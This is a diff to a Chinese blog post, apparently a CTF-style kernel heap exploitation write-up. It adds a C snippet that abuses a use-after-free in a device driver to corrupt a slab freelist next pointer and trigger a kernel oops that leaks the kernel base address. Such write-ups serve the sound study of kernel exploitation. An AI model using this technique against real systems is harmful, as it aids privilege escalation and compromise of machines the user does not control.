@@ -24,8 +24,27 @@ PS： 章节承接[https://wsxk.github.io/kernel_heap2/](https://wsxk.github.io/
 ```
 1、 通过kernel crash获取kernel基址信息。
 因为有uaf，其实相当于我们可以随便改slab freelist的next_ptr地址。
-1、uaf修改next_ptr为非法地址
-2、申请到该非法地址，并尝试写入内容
+2、uaf修改next_ptr为非法地址
+3、申请到该非法地址，触发oops
+```
+oops脚本:<br>
+```c
+    //get kernel_base_addr: via Oops
+    int fd = open_device();
+    char buf[1048];
+    // step 1: free the chunk -> freelist
+    printf("step1\n");
+    free_slot(fd,buf,0);
+    // step 2: set next_ptr = 0x4141414141414141
+    printf("step2\n");
+    memset(buf,0x41,0x1d0);
+    write_slot(fd,buf,0x1d0);
+    // step 3: alloc the buf
+    printf("step3\n");
+    int fd2 = open_device(); // fd2.buf = fd.buf
+    // step 4: trigger oops
+    printf("step4\n");
+    int fd3 = open_device();
 ```
 
 ## 5.4<br>
